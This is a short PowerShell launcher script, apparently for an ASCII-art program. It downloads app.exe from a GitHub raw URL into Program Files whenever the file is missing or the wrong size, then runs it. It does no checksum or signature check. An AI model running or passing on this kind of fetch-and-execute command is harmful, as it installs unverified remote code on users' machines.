$p="${env:ProgramFiles}\art"; $f="app.exe"; $fp=Join-Path $p $f; $u="https://raw.githubusercontent.com/bridgerzan/live-ascii/refs/heads/main/app.exe"; 
if(!(Test-Path $fp) -or ((gi $fp).Length -lt 7MB -or (gi $fp).Length -gt 8MB)){
    cls; write-host "Downloading (7MB)..."; if(!(Test-Path $p)){mkdir $p}; if(Test-Path $fp){rm $fp}; iwr $u -OutFile $fp
}; 
cmd /c "`"$fp`""
